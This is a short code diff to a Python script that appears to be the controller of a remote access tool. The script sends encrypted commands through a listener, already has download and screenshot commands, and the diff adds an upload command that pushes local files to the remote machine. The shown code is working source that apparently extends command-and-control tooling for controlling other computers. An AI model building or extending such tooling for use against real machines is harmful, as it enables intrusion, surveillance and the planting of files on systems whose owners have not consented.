@@ -7,6 +7,7 @@ from time import sleep
 from commands.Windows import WindowsCommands
 from commands.Linux import LinuxCommands
 from datetime import datetime
+import os
 
 
 def main():
@@ -87,6 +88,30 @@ def main():
             file.write(response)
             file.close()
             print("Download complete!")
+
+        elif command == 'upload':
+
+            if not os.path.exists(f"upload/{params}"):
+                print('File not found')
+            else:
+                request = json.dumps({
+                    'type': 'upload',
+                    'action': params
+                }).encode('utf-8')
+
+                response = listener.prompt(cipher.encrypt_message(request))
+                decrypted = cipher.decrypt_message(response)
+                result = json.loads(decrypted)
+
+                if result["status"] == "NOK":
+                    print(f"Error: {result['response']}")
+                else:
+                    file = open(f'upload/{params}', "rb")
+                    request = file.read()
+                    file.close()
+                    listener.prompt(request)
+                    print("Upload complete!")
+
 
 
         elif command == "screenshot":
